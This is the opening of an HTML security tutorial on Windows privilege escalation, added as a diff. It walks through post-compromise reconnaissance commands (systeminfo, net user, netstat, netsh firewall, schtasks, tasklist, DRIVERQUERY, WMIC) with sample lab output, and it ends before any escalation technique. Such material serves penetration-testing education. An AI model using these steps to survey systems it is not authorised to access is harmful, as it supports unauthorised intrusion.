@@ -1,0 +1,1354 @@
+<html lang="en" class="csstransforms csstransforms3d csstransitions js js"><!--<![endif]--><head>
+
+<meta charset="utf-8">
+<title>FuzzySecurity | Windows Privilege Escalation Fundamentals</title>
+<meta name="description" content="">
+<meta name="author" content="">
+
+<script type="text/javascript" async="" src="https://www.googletagmanager.com/gtag/js?id=G-4M26T62XTC&amp;cx=c&amp;_slc=1"></script><script async="" src="//www.google-analytics.com/analytics.js"></script><script src="/cdn-cgi/apps/head/VrjJP-Z7Ka9Y_QgTS2b68bZwbd8.js"></script><link rel="stylesheet" href="../css/style.css">
+
+<link rel="stylesheet" href="../css/skins/red.css" name="skins">
+
+<link rel="stylesheet" href="../css/layout/wide.css" name="layout">
+
+<link rel="stylesheet" href="../css/icons.css">
+
+<script src="../js/jquery-1.7.2.min.js"></script> 
+<script src="../js/jquery.easing.1.3.min.js"></script> 
+<script src="../js/jquery-ui.min.js"></script> 
+<script src="../js/jquery.cookie.js"></script> 
+<script src="../js/jquery.uniform.min.js"></script> 
+<script src="../js/ddsmoothmenu.js"></script> 
+<script src="../js/jquery.flexslider.js"></script> 
+<script src="../js/jquery.eislideshow.js"></script> 
+<script src="../js/jquery.iconmenu.js"></script> 
+<script src="../js/colortip.js"></script> 
+<script src="../js/tytabs.js"></script> 
+<script src="../js/carousel.js"></script> 
+<script src="../js/jquery.prettyPhoto.js"></script> 
+<script src="../js/jquery.isotope.min.js"></script> 
+<script src="../js/selectnav.js"></script> 
+<script src="../js/jquery.ui.totop.js"></script> 
+<script src="../js/custom.js"></script> 
+
+<!--[if lt IE 9]>
+      <script src="js/html5.js"></script>
+  <![endif]-->
+
+<link rel="shortcut icon" href="../images/favicon/favicon.ico">
+<link rel="apple-touch-icon" href="../images/favicon/apple-touch-icon.png">
+<link rel="apple-touch-icon" sizes="72x72" href="../images/favicon/apple-touch-icon-72x72.png">
+<link rel="apple-touch-icon" sizes="114x114" href="../images/favicon/apple-touch-icon-114x114.png">
+<script type="text/javascript" src="https://intensedebate.com/js/genericCommentWrapper2.php?acct=77033bd2b8799fdea5c0f689f55f6e1e&amp;postid=https%3A%2F%2Ffuzzysecurity.com%2Ftutorials%2F16.html&amp;title=FuzzySecurity%20%7C%20Windows%20Privilege%20Escalation%20Fundamentals&amp;url=https%3A%2F%2Ffuzzysecurity.com%2Ftutorials%2F16.html"></script><script src="https://www.intensedebate.com/idc/js/comment-func.php?token=Qs9MSA5L5qjdH3BS4eWppXc6FxGuMuAg&amp;blogpostid=581656670&amp;time=1718454005810" type="text/javascript"></script><script src="https://r-login.wordpress.com/remote-login.php?action=script_redirect&amp;url_hash=fe64a23e7c1ea4374d30bbee5f50e00f&amp;id=intensedebate&amp;url=https%3A%2F%2Fwww.intensedebate.com%2Fidc%2Fjs%2Fcomment-func.php%3Fblogpostid%3D581656670%26token%3DQs9MSA5L5qjdH3BS4eWppXc6FxGuMuAg%26return%3Dtrue" type="text/javascript"></script></head>
+<body>
+<div id="wrap" class="boxed">
+<header>
+<div class="container clearfix">
+<div class="five columns">
+<div class="logo">
+<a href="index.html">
+<img src="../images/logo.png" alt="FuzzySec">
+</a>
+</div>
+</div>
+<div class="eleven columns">
+<nav id="menu" class="navigation">
+<ul id="nav">
+<li><a href="../index.html">Home</a>
+</li>
+<li><a href="../tutorials.html" class="active">Tutorials</a>
+</li>
+<li><a href="../coding.html">Scripting</a>
+</li>
+<li><a href="../exploits.html">Exploits</a>
+</li>
+<li><a href="../links.html">Links</a>
+</li>
+<li><a href="../patreon.html">Patreon</a></li><li><a href="../contact.html">Contact</a></li>
+</ul><select class="selectnav" id="selectnav1"><option value="">- Navigation Menu - </option><option value="https://fuzzysecurity.com/index.html">Home</option><option value="https://fuzzysecurity.com/tutorials.html" selected="">Tutorials</option><option value="https://fuzzysecurity.com/coding.html">Scripting</option><option value="https://fuzzysecurity.com/exploits.html">Exploits</option><option value="https://fuzzysecurity.com/links.html">Links</option><option value="https://fuzzysecurity.com/patreon.html">Patreon</option><option value="https://fuzzysecurity.com/contact.html">Contact</option></select>
+</nav>
+</div>
+<div class="sixteen columns"><hr></div>
+</div>
+</header>
+<div class="container clearfix">
+<div class="page-columns">
+<ul class="breadcrumbs">
+<li><a href="index.html"><span class="icon home gray"></span></a></li>
+<li><a href="../index.html">Home</a> <b>»</b></li>
+<li><a href="../tutorials.html">Tutorials</a> <b>»</b></li>
+<li>Windows Privilege Escalation Fundamentals</li>
+</ul>
+
+<div class="recent-work gallery clearfix">
+<div class="eighteen columns bottom">
+<div style="height:20px;" align="right">
+<link type="text/css" rel="stylesheet" href="https://www.fuzzysecurity.com/css/patreon.css">
+<button class="btn btn-2 btn-2g"><a href="https://www.patreon.com/FuzzySec" target="_blank"><img src="https://c5.patreon.com/external/logo/become_a_patron_button.png" style="border-radius: 10px;height:40px;"></a></button>
+</div>
+<h2 class="title">Windows Privilege Escalation Fundamentals<span class="line"></span></h2>
+<div class="fourteen columns bottom">
+<p>Not many people talk about serious Windows privilege escalation which is a shame. I think the reasons for this are probably (1) during pentesting engagements a low-priv shell is often all the proof you need for the customer, (2) in staged environments you often pop the Administrator account, (3) meterpreter makes you lazy (getsystem = lazy-fu), (4) build reviews to often end up being --&gt; authenticated nessus scan, microsoft security baseline analyser...<br><br>
+Contrary to common perception Windows boxes can be really well locked down if they are configured with care. On top of that the patch time window of opportunity is small. So lets dig into the dark corners of the Windows OS and see if we can get SYSTEM.<br><br>
+It should be noted that I'll be using various versions of Windows to highlight any commandline differences that may exist. Keep this in mind as various OS/SP differences may exist in terms of commands not existing or generating slightly different output. I have tried to structure this tutorial so it will apply in the most general way to Windows privilege escalation.<br><br>
+Finally I want to give a shout out to my friend Kostas who also really loves post-exploitation, you really don't want him to be logged into your machine hehe.<br><br>
+Indispensable Resources:<br>
+Encyclopaedia Of Windows Privilege Escalation (Brett Moore) - <a href="https://www.youtube.com/watch?v=kMG8IsCohHA">here</a>.<br>
+Windows Attacks: AT is the new black (Chris Gates &amp; Rob Fuller) - <a href="https://www.youtube.com/watch?v=_8xJaaQlpBo">here</a>.<br>
+Elevating privileges by exploiting weak folder permissions (Parvez Anwar) - <a href="http://www.greyhathacker.net/?p=738">here</a>.
+</p><br>
+<h2 class="title">Δt for t0 to t3 - Initial Information Gathering<span class="line"></span></h2>
+<p>The starting point for this tutorial is an unprivileged shell on a box. We might have used a remote exploit or a client-side attack and we got a shell back. Basically at time t0 we have no understanding of the machine, what it does, what it is connected to, what level of privilege we have or even what operating system it is.<br><br>
+Initially we will want to quickly gather some essential information so we can get a lay of the land and asses our situation.<br><br>
+First let's find out what OS we are connected to:</p>
+<div class="terminal_wrap" style="background:#CCC">
+<pre><span style="color:#ff0000;">C:\Windows\system32</span>&gt; <span style="color:#2B8156;">systeminfo | findstr /B /C:"OS Name" /C:"OS Version"</span>
+OS Name:                   Microsoft Windows 7 Professional
+OS Version:                6.1.7601 Service Pack 1 Build 7601</pre>
+<br>
+</div>
+<p>&nbsp;</p>
+<p>Next we will see what the hostname is of the box and what user we are connected as.</p>
+<div class="terminal_wrap" style="background:#CCC">
+<pre><span style="color:#ff0000;">C:\Windows\system32</span>&gt; <span style="color:#2B8156;">hostname</span>
+b33f
+
+<span style="color:#ff0000;">C:\Windows\system32</span>&gt; <span style="color:#2B8156;">echo %username%</span>
+user1</pre>
+<br>
+</div>
+<p>&nbsp;</p>
+<p>Now we have this basic information we list the other user accounts on the box and view our own user's information in a bit more detail. We can already see that user1 is not part of the localgroup Administrators.</p>
+<div class="terminal_wrap" style="background:#CCC">
+<pre><span style="color:#ff0000;">C:\Windows\system32</span>&gt; <span style="color:#2B8156;">net users</span>
+
+User accounts for \\B33F
+
+-------------------------------------------------------------------------------
+Administrator            b33f                     Guest
+user1
+The command completed successfully.
+
+<span style="color:#ff0000;">C:\Windows\system32</span>&gt; <span style="color:#2B8156;">net user user1</span>
+
+User name                    user1
+Full Name
+Comment
+User's comment
+Country code                 000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            1/11/2014 7:47:14 PM
+Password expires             Never
+Password changeable          1/11/2014 7:47:14 PM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   1/11/2014 8:05:09 PM
+
+Logon hours allowed          All
+
+Local Group Memberships      *Users
+Global Group memberships     *None
+The command completed successfully.</pre>
+<br>
+</div>
+<p>&nbsp;</p>
+<p>That is all we need to know about users and permissions for the moment. Next on our list is networking, what is the machine connected to and what rules does it impose on those connections.<br><br>
+First let's have a look at the available network interfaces and routing table.</p>
+<div class="terminal_wrap" style="background:#CCC">
+<pre><span style="color:#ff0000;">C:\Windows\system32</span>&gt; <span style="color:#2B8156;">ipconfig /all</span>
+
+Windows IP Configuration
+
+   Host Name . . . . . . . . . . . . : b33f
+   Primary Dns Suffix  . . . . . . . :
+   Node Type . . . . . . . . . . . . : Hybrid
+   IP Routing Enabled. . . . . . . . : No
+   WINS Proxy Enabled. . . . . . . . : No
+
+Ethernet adapter Bluetooth Network Connection:
+
+   Media State . . . . . . . . . . . : Media disconnected
+   Connection-specific DNS Suffix  . :
+   Description . . . . . . . . . . . : Bluetooth Device (Personal Area Network)
+   Physical Address. . . . . . . . . : 0C-84-DC-62-60-29
+   DHCP Enabled. . . . . . . . . . . : Yes
+   Autoconfiguration Enabled . . . . : Yes
+   
+Ethernet adapter Local Area Connection:
+
+   Connection-specific DNS Suffix  . :
+   Description . . . . . . . . . . . : Intel(R) PRO/1000 MT Network Connection
+   Physical Address. . . . . . . . . : 00-0C-29-56-79-35
+   DHCP Enabled. . . . . . . . . . . : Yes
+   Autoconfiguration Enabled . . . . : Yes
+   Link-local IPv6 Address . . . . . : fe80::5cd4:9caf:61c0:ba6e%11(Preferred)
+   IPv4 Address. . . . . . . . . . . : 192.168.0.104(Preferred)
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Lease Obtained. . . . . . . . . . : Saturday, January 11, 2014 3:53:55 PM
+   Lease Expires . . . . . . . . . . : Sunday, January 12, 2014 3:53:55 PM
+   Default Gateway . . . . . . . . . : 192.168.0.1
+   DHCP Server . . . . . . . . . . . : 192.168.0.1
+   DHCPv6 IAID . . . . . . . . . . . : 234884137
+   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-18-14-24-1D-00-0C-29-56-79-35
+   DNS Servers . . . . . . . . . . . : 192.168.0.1
+   NetBIOS over Tcpip. . . . . . . . : Enabled
+
+<span style="color:#ff0000;">C:\Windows\system32</span>&gt; <span style="color:#2B8156;">route print</span>
+
+===========================================================================
+Interface List
+ 18...0c 84 dc 62 60 29 ......Bluetooth Device (Personal Area Network)
+ 13...00 ff 0c 0d 4f ed ......TAP-Windows Adapter V9
+ 11...00 0c 29 56 79 35 ......Intel(R) PRO/1000 MT Network Connection
+  1...........................Software Loopback Interface 1
+ 16...00 00 00 00 00 00 00 e0 Microsoft ISATAP Adapter
+ 15...00 00 00 00 00 00 00 e0 Microsoft ISATAP Adapter #2
+ 19...00 00 00 00 00 00 00 e0 Microsoft ISATAP Adapter #3
+ 14...00 00 00 00 00 00 00 e0 Teredo Tunneling Pseudo-Interface
+===========================================================================
+
+IPv4 Route Table
+===========================================================================
+Active Routes:
+Network Destination        Netmask          Gateway       Interface  Metric
+          0.0.0.0          0.0.0.0      192.168.0.1    192.168.0.104     10
+        127.0.0.0        255.0.0.0         On-link         127.0.0.1    306
+        127.0.0.1  255.255.255.255         On-link         127.0.0.1    306
+  127.255.255.255  255.255.255.255         On-link         127.0.0.1    306
+      192.168.0.0    255.255.255.0         On-link     192.168.0.104    266
+    192.168.0.104  255.255.255.255         On-link     192.168.0.104    266
+    192.168.0.255  255.255.255.255         On-link     192.168.0.104    266
+        224.0.0.0        240.0.0.0         On-link         127.0.0.1    306
+        224.0.0.0        240.0.0.0         On-link     192.168.0.104    266
+  255.255.255.255  255.255.255.255         On-link         127.0.0.1    306
+  255.255.255.255  255.255.255.255         On-link     192.168.0.104    266
+===========================================================================
+Persistent Routes:
+  None
+
+IPv6 Route Table
+===========================================================================
+Active Routes:
+ If Metric Network Destination      Gateway
+ 14     58 ::/0                     On-link
+  1    306 ::1/128                  On-link
+ 14     58 2001::/32                On-link
+ 14    306 2001:0:5ef5:79fb:8d2:b4e:3f57:ff97/128
+                                    On-link
+ 11    266 fe80::/64                On-link
+ 14    306 fe80::/64                On-link
+ 14    306 fe80::8d2:b4e:3f57:ff97/128
+                                    On-link
+ 11    266 fe80::5cd4:9caf:61c0:ba6e/128
+                                    On-link
+  1    306 ff00::/8                 On-link
+ 14    306 ff00::/8                 On-link
+ 11    266 ff00::/8                 On-link
+===========================================================================
+Persistent Routes:
+  None
+  
+<span style="color:#990066;"><strong># arp -A displays the ARP (Address Resolution Protocol) cache table for all available interfaces.</strong></span>
+
+<span style="color:#ff0000;">C:\Windows\system32</span>&gt; <span style="color:#2B8156;">arp -A</span>
+
+Interface: 192.168.0.104 --- 0xb
+  Internet Address      Physical Address      Type
+  192.168.0.1           90-94-e4-c5-b0-46     dynamic
+  192.168.0.101         ac-22-0b-af-bb-43     dynamic
+  192.168.0.255         ff-ff-ff-ff-ff-ff     static
+  224.0.0.22            01-00-5e-00-00-16     static
+  224.0.0.251           01-00-5e-00-00-fb     static
+  224.0.0.252           01-00-5e-00-00-fc     static
+  239.255.255.250       01-00-5e-7f-ff-fa     static
+  255.255.255.255       ff-ff-ff-ff-ff-ff     static</pre>
+<br>
+</div>
+<p>&nbsp;</p>
+<p>That brings us to the active network connections and the firewall rules.</p>
+<div class="terminal_wrap" style="background:#CCC">
+<pre><span style="color:#ff0000;">C:\Windows\system32</span>&gt; <span style="color:#2B8156;">netstat -ano</span>
+
+Active Connections
+
+  Proto  Local Address          Foreign Address        State           PID
+  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       684
+  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:5357           0.0.0.0:0              LISTENING       4
+  TCP    127.0.0.1:5354         0.0.0.0:0              LISTENING       1400
+  TCP    192.168.0.104:139      0.0.0.0:0              LISTENING       4
+  TCP    [::]:135               [::]:0                 LISTENING       684
+  TCP    [::]:445               [::]:0                 LISTENING       4
+  TCP    [::]:5357              [::]:0                 LISTENING       4
+  UDP    0.0.0.0:5355           *:*                                    1100
+  UDP    0.0.0.0:52282          *:*                                    976
+  UDP    0.0.0.0:55202          *:*                                    2956
+  UDP    0.0.0.0:59797          *:*                                    1400
+  UDP    127.0.0.1:1900         *:*                                    2956
+  UDP    127.0.0.1:65435        *:*                                    2956
+  UDP    192.168.0.104:137      *:*                                    4
+  UDP    192.168.0.104:138      *:*                                    4
+  UDP    192.168.0.104:1900     *:*                                    2956
+  UDP    192.168.0.104:5353     *:*                                    1400
+  UDP    192.168.0.104:65434    *:*                                    2956
+  UDP    [::]:5355              *:*                                    1100
+  UDP    [::]:52281             *:*                                    976
+  UDP    [::]:52283             *:*                                    976
+  UDP    [::]:55203             *:*                                    2956
+  UDP    [::]:59798             *:*                                    1400
+  UDP    [::1]:1900             *:*                                    2956
+  UDP    [::1]:5353             *:*                                    1400
+  UDP    [::1]:65433            *:*                                    2956
+  UDP    [fe80::5cd4:9caf:61c0:ba6e%11]:1900  *:*                      2956
+  UDP    [fe80::5cd4:9caf:61c0:ba6e%11]:65432  *:*                     2956
+  
+<span style="color:#990066;"><strong># The following two netsh commands are examples of commands that are not universal across OS/SP. The netsh
+firewall commands are only available from XP SP2 and upwards.</strong></span>
+
+<span style="color:#ff0000;">C:\Windows\system32</span>&gt; <span style="color:#2B8156;">netsh firewall show state</span>
+
+Firewall status:
+-------------------------------------------------------------------
+Profile                           = Standard
+Operational mode                  = Enable
+Exception mode                    = Enable
+Multicast/broadcast response mode = Enable
+Notification mode                 = Enable
+Group policy version              = Windows Firewall
+Remote admin mode                 = Disable
+
+Ports currently open on all network interfaces:
+Port   Protocol  Version  Program
+-------------------------------------------------------------------
+No ports are currently open on all network interfaces.
+
+<span style="color:#ff0000;">C:\Windows\system32</span>&gt; <span style="color:#2B8156;">netsh firewall show config</span>
+
+Domain profile configuration:
+-------------------------------------------------------------------
+Operational mode                  = Enable
+Exception mode                    = Enable
+Multicast/broadcast response mode = Enable
+Notification mode                 = Enable
+
+Allowed programs configuration for Domain profile:
+Mode     Traffic direction    Name / Program
+-------------------------------------------------------------------
+
+Port configuration for Domain profile:
+Port   Protocol  Mode    Traffic direction     Name
+-------------------------------------------------------------------
+
+ICMP configuration for Domain profile:
+Mode     Type  Description
+-------------------------------------------------------------------
+Enable   2     Allow outbound packet too big
+
+Standard profile configuration (current):
+-------------------------------------------------------------------
+Operational mode                  = Enable
+Exception mode                    = Enable
+Multicast/broadcast response mode = Enable
+Notification mode                 = Enable
+
+Service configuration for Standard profile:
+Mode     Customized  Name
+-------------------------------------------------------------------
+Enable   No          Network Discovery
+
+Allowed programs configuration for Standard profile:
+Mode     Traffic direction    Name / Program
+-------------------------------------------------------------------
+Enable   Inbound              COMRaider / E:\comraider\comraider.exe
+Enable   Inbound              nc.exe / C:\users\b33f\desktop\nc.exe
+
+Port configuration for Standard profile:
+Port   Protocol  Mode    Traffic direction     Name
+-------------------------------------------------------------------
+
+ICMP configuration for Standard profile:
+Mode     Type  Description
+-------------------------------------------------------------------
+Enable   2     Allow outbound packet too big
+
+Log configuration:
+-------------------------------------------------------------------
+File location   = C:\Windows\system32\LogFiles\Firewall\pfirewall.log
+Max file size   = 4096 KB
+Dropped packets = Disable
+Connections     = Disable</pre>
+<br>
+</div>
+<p>&nbsp;</p>
+<p>Finally we will take a brief look at the what is running on the compromised box: scheduled tasks, running processes, started services and installed drivers.</p>
+<div class="terminal_wrap" style="background:#CCC">
+<pre><span style="color:#990066;"><strong># This will display verbose output for all scheduled tasks, below you can see sample output for a
+single task.</strong></span>
+
+<span style="color:#ff0000;">C:\Windows\system32</span>&gt; <span style="color:#2B8156;">schtasks /query /fo LIST /v</span>
+
+Folder: \Microsoft\Windows Defender
+HostName:                             B33F
+TaskName:                             \Microsoft\Windows Defender\MP Scheduled Scan
+Next Run Time:                        1/22/2014 5:11:13 AM
+Status:                               Ready
+Logon Mode:                           Interactive/Background
+Last Run Time:                        N/A
+Last Result:                          1
+Author:                               N/A
+Task To Run:                          c:\program files\windows defender\MpCmdRun.exe Scan -ScheduleJob
+                                      -WinTask -RestrictPrivilegesScan
+Start In:                             N/A
+Comment:                              Scheduled Scan
+Scheduled Task State:                 Enabled
+Idle Time:                            Only Start If Idle for 1 minutes, If Not Idle Retry For 240 minutes
+Power Management:                     No Start On Batteries
+Run As User:                          SYSTEM
+Delete Task If Not Rescheduled:       Enabled
+Stop Task If Runs X Hours and X Mins: 72:00:00
+Schedule:                             Scheduling data is not available in this format.
+Schedule Type:                        Daily
+Start Time:                           5:11:13 AM
+Start Date:                           1/1/2000
+End Date:                             1/1/2100
+Days:                                 Every 1 day(s)
+Months:                               N/A
+Repeat: Every:                        Disabled
+Repeat: Until: Time:                  Disabled
+Repeat: Until: Duration:              Disabled
+Repeat: Stop If Still Running:        Disabled
+<span style="color:#2B8156;">[..Snip..]</span>
+
+<span style="color:#990066;"><strong># The following command links running processes to started services.</strong></span>
+
+<span style="color:#ff0000;">C:\Windows\system32</span>&gt; <span style="color:#2B8156;">tasklist /SVC</span>
+
+Image Name                     PID Services
+========================= ======== ============================================
+System Idle Process              0 N/A
+System                           4 N/A
+smss.exe                       244 N/A
+csrss.exe                      332 N/A
+csrss.exe                      372 N/A
+wininit.exe                    380 N/A
+winlogon.exe                   428 N/A
+services.exe                   476 N/A
+lsass.exe                      484 SamSs
+lsm.exe                        496 N/A
+svchost.exe                    588 DcomLaunch, PlugPlay, Power
+svchost.exe                    668 RpcEptMapper, RpcSs
+svchost.exe                    760 Audiosrv, Dhcp, eventlog,
+                                   HomeGroupProvider, lmhosts, wscsvc
+svchost.exe                    800 AudioEndpointBuilder, CscService, Netman,
+                                   SysMain, TrkWks, UxSms, WdiSystemHost,
+                                   wudfsvc
+svchost.exe                    836 AeLookupSvc, BITS, gpsvc, iphlpsvc,
+                                   LanmanServer, MMCSS, ProfSvc, Schedule,
+                                   seclogon, SENS, ShellHWDetection, Themes,
+                                   Winmgmt, wuauserv
+audiodg.exe                    916 N/A
+svchost.exe                    992 EventSystem, fdPHost, netprofm, nsi,
+                                   WdiServiceHost, WinHttpAutoProxySvc
+svchost.exe                   1104 CryptSvc, Dnscache, LanmanWorkstation,
+                                   NlaSvc
+spoolsv.exe                   1244 Spooler
+svchost.exe                   1272 BFE, DPS, MpsSvc
+mDNSResponder.exe             1400 Bonjour Service
+taskhost.exe                  1504 N/A
+taskeng.exe                   1556 N/A
+vmtoolsd.exe                  1580 VMTools
+dwm.exe                       1660 N/A
+explorer.exe                  1668 N/A
+vmware-usbarbitrator.exe      1768 VMUSBArbService
+TPAutoConnSvc.exe             1712 TPAutoConnSvc
+<span style="color:#2B8156;">[..Snip..]</span>
+
+<span style="color:#ff0000;">C:\Windows\system32</span>&gt; <span style="color:#2B8156;">net start</span>
+
+These Windows services are started:
+
+   Application Experience
+   Application Information
+   Background Intelligent Transfer Service
+   Base Filtering Engine
+   Bluetooth Support Service
+   Bonjour Service
+   COM+ Event System
+   COM+ System Application
+   Cryptographic Services
+   DCOM Server Process Launcher
+   Desktop Window Manager Session Manager
+   DHCP Client
+   Diagnostic Policy Service
+   Diagnostic Service Host
+   Diagnostic System Host
+   Distributed Link Tracking Client
+   Distributed Transaction Coordinator
+   DNS Client
+   Function Discovery Provider Host
+   Function Discovery Resource Publication
+   Group Policy Client
+<span style="color:#2B8156;">[..Snip..]</span>
+   
+<span style="color:#990066;"><strong># This can be useful sometimes as some 3rd party drivers, even by reputable companies, contain more holes
+than Swiss cheese. This is only possible because ring0 exploitation lies outside most peoples expertise.</strong></span>
+
+<span style="color:#ff0000;">C:\Windows\system32</span>&gt; <span style="color:#2B8156;">DRIVERQUERY</span>
+
+Module Name  Display Name           Driver Type   Link Date
+============ ====================== ============= ======================
+1394ohci     1394 OHCI Compliant Ho Kernel        11/20/2010 6:01:11 PM
+ACPI         Microsoft ACPI Driver  Kernel        11/20/2010 4:37:52 PM
+AcpiPmi      ACPI Power Meter Drive Kernel        11/20/2010 4:47:55 PM
+adp94xx      adp94xx                Kernel        12/6/2008 7:59:55 AM
+adpahci      adpahci                Kernel        5/2/2007 1:29:26 AM
+adpu320      adpu320                Kernel        2/28/2007 8:03:08 AM
+AFD          Ancillary Function Dri Kernel        11/20/2010 4:40:00 PM
+agp440       Intel AGP Bus Filter   Kernel        7/14/2009 7:25:36 AM
+aic78xx      aic78xx                Kernel        4/12/2006 8:20:11 AM
+aliide       aliide                 Kernel        7/14/2009 7:11:17 AM
+amdagp       AMD AGP Bus Filter Dri Kernel        7/14/2009 7:25:36 AM
+amdide       amdide                 Kernel        7/14/2009 7:11:19 AM
+AmdK8        AMD K8 Processor Drive Kernel        7/14/2009 7:11:03 AM
+AmdPPM       AMD Processor Driver   Kernel        7/14/2009 7:11:03 AM
+amdsata      amdsata                Kernel        3/19/2010 9:08:27 AM
+amdsbs       amdsbs                 Kernel        3/21/2009 2:35:26 AM
+amdxata      amdxata                Kernel        3/20/2010 12:19:01 AM
+AppID        AppID Driver           Kernel        11/20/2010 5:29:48 PM
+arc          arc                    Kernel        5/25/2007 5:31:06 AM
+<span style="color:#2B8156;">[..Snip..]</span></pre>
+<br>
+</div>
+<p>&nbsp;</p>
+<h2 class="title">Δt for t4 - The Arcane Arts Of WMIC<span class="line"></span></h2>
+<p>I want to mention WMIC (Windows Management Instrumentation Command-Line) separately as it is Windows most useful command line tool. WIMIC can be very practical for information gathering and post-exploitation. That being said it is a bit clunky and the output leaves much to be desired for.<br><br>
+Fully explaining the use of WMIC would take a tutorial all of it's own. Not to mention that some of the output would be difficult to display due to the formatting.<br><br>
+I have listed two resources below that are well worth reading on the subject matter:<br>
+Command-Line Ninjitsu (SynJunkie) - <a href="https://synjunkie.blogspot.com/2008/03/command-line-ninjitsu.html">here</a><br>
+Windows WMIC Command Line (ComputerHope) - <a href="http://www.computerhope.com/wmic.htm">here</a><br><br>
+Unfortunately some default configurations of windows do not allow access to WMIC unless the user is in the Administrators group (which is probably a really good idea). From my testing with VM's I noticed that any version of XP did not allow access to WMIC from a low privileged account. Contrary, default installations of Windows 7 Professional and Windows 8 Enterprise allowed low privilege users to use WMIC and query the operating system without modifying any settings. This is exactly what we need as we are using WMIC to gather information about the target machine.<br><br>
+To give you an idea about the extensive options that WMIC has I have listed the available command line switches below.</p>
+<div class="terminal_wrap" style="background:#CCC">
+<pre><span style="color:#ff0000;">C:\Windows\system32</span>&gt; <span style="color:#2B8156;">wmic /?</span>
+
+[global switches] <command>
+
+The following global switches are available:
+/NAMESPACE           Path for the namespace the alias operate against.
+/ROLE                Path for the role containing the alias definitions.
+/NODE                Servers the alias will operate against.
+/IMPLEVEL            Client impersonation level.
+/AUTHLEVEL           Client authentication level.
+/LOCALE              Language id the client should use.
+/PRIVILEGES          Enable or disable all privileges.
+/TRACE               Outputs debugging information to stderr.
+/RECORD              Logs all input commands and output.
+/INTERACTIVE         Sets or resets the interactive mode.
+/FAILFAST            Sets or resets the FailFast mode.
+/USER                User to be used during the session.
+/PASSWORD            Password to be used for session login.
+/OUTPUT              Specifies the mode for output redirection.
+/APPEND              Specifies the mode for output redirection.
+/AGGREGATE           Sets or resets aggregate mode.
+/AUTHORITY           Specifies the <authority type=""> for the connection.
+/?[:&lt;BRIEF|FULL&gt;]    Usage information.
+
+For more information on a specific global switch, type: switch-name /?
+
+
+The following alias/es are available in the current role:
+ALIAS                    - Access to the aliases available on the local system
+BASEBOARD                - Base board (also known as a motherboard or system board) management.
+BIOS                     - Basic input/output services (BIOS) management.
+BOOTCONFIG               - Boot configuration management.
+CDROM                    - CD-ROM management.
+COMPUTERSYSTEM           - Computer system management.
+CPU                      - CPU management.
+CSPRODUCT                - Computer system product information from SMBIOS.
+DATAFILE                 - DataFile Management.
+DCOMAPP                  - DCOM Application management.
+DESKTOP                  - User's Desktop management.
+DESKTOPMONITOR           - Desktop Monitor management.
+DEVICEMEMORYADDRESS      - Device memory addresses management.
+DISKDRIVE                - Physical disk drive management.
+DISKQUOTA                - Disk space usage for NTFS volumes.
+DMACHANNEL               - Direct memory access (DMA) channel management.
+ENVIRONMENT              - System environment settings management.
+FSDIR                    - Filesystem directory entry management.
+GROUP                    - Group account management.
+IDECONTROLLER            - IDE Controller management.
+IRQ                      - Interrupt request line (IRQ) management.
+JOB                      - Provides  access to the jobs scheduled using the schedule service.
+LOADORDER                - Management of system services that define execution dependencies.
+LOGICALDISK              - Local storage device management.
+LOGON                    - LOGON Sessions.
+MEMCACHE                 - Cache memory management.
+MEMORYCHIP               - Memory chip information.
+MEMPHYSICAL              - Computer system's physical memory management.
+NETCLIENT                - Network Client management.
+NETLOGIN                 - Network login information (of a particular user) management.
+NETPROTOCOL              - Protocols (and their network characteristics) management.
+NETUSE                   - Active network connection management.
+NIC                      - Network Interface Controller (NIC) management.
+NICCONFIG                - Network adapter management.
+NTDOMAIN                 - NT Domain management.
+NTEVENT                  - Entries in the NT Event Log.
+NTEVENTLOG               - NT eventlog file management.
+ONBOARDDEVICE            - Management of common adapter devices built into the motherboard (system board).
+OS                       - Installed Operating System/s management.
+PAGEFILE                 - Virtual memory file swapping management.
+PAGEFILESET              - Page file settings management.
+PARTITION                - Management of partitioned areas of a physical disk.
+PORT                     - I/O port management.
+PORTCONNECTOR            - Physical connection ports management.
+PRINTER                  - Printer device management.
+PRINTERCONFIG            - Printer device configuration management.
+PRINTJOB                 - Print job management.
+PROCESS                  - Process management.
+PRODUCT                  - Installation package task management.
+QFE                      - Quick Fix Engineering.
+QUOTASETTING             - Setting information for disk quotas on a volume.
+RDACCOUNT                - Remote Desktop connection permission management.
+RDNIC                    - Remote Desktop connection management on a specific network adapter.
+RDPERMISSIONS            - Permissions to a specific Remote Desktop connection.
+RDTOGGLE                 - Turning Remote Desktop listener on or off remotely.
+RECOVEROS                - Information that will be gathered from memory when the operating system fails.
+REGISTRY                 - Computer system registry management.
+SCSICONTROLLER           - SCSI Controller management.
+SERVER                   - Server information management.
+SERVICE                  - Service application management.
+SHADOWCOPY               - Shadow copy management.
+SHADOWSTORAGE            - Shadow copy storage area management.
+SHARE                    - Shared resource management.
+SOFTWAREELEMENT          - Management of the  elements of a software product installed on a system.
+SOFTWAREFEATURE          - Management of software product subsets of SoftwareElement.
+SOUNDDEV                 - Sound Device management.
+STARTUP                  - Management of commands that run automatically when users log onto the computer 
+                           system.
+SYSACCOUNT               - System account management.
+SYSDRIVER                - Management of the system driver for a base service.
+SYSTEMENCLOSURE          - Physical system enclosure management.
+SYSTEMSLOT               - Management of physical connection points including ports,  slots and 
+                           peripherals, and proprietary connections points.
+TAPEDRIVE                - Tape drive management.
+TEMPERATURE              - Data management of a temperature sensor (electronic thermometer).
+TIMEZONE                 - Time zone data management.
+UPS                      - Uninterruptible power supply (UPS) management.
+USERACCOUNT              - User account management.
+VOLTAGE                  - Voltage sensor (electronic voltmeter) data management.
+VOLUME                   - Local storage volume management.
+VOLUMEQUOTASETTING       - Associates the disk quota setting with a specific disk volume.
+VOLUMEUSERQUOTA          - Per user storage volume quota management.
+WMISET                   - WMI service operational parameters management.
+
+For more information on a specific alias, type: alias /?
+
+CLASS     - Escapes to full WMI schema.
+PATH      - Escapes to full WMI object paths.
+CONTEXT   - Displays the state of all the global switches.
+QUIT/EXIT - Exits the program.
+
+For more information on CLASS/PATH/CONTEXT, type: (CLASS | PATH | CONTEXT) /?</authority></command></pre>
+<br>
+</div>
+<p>&nbsp;</p>
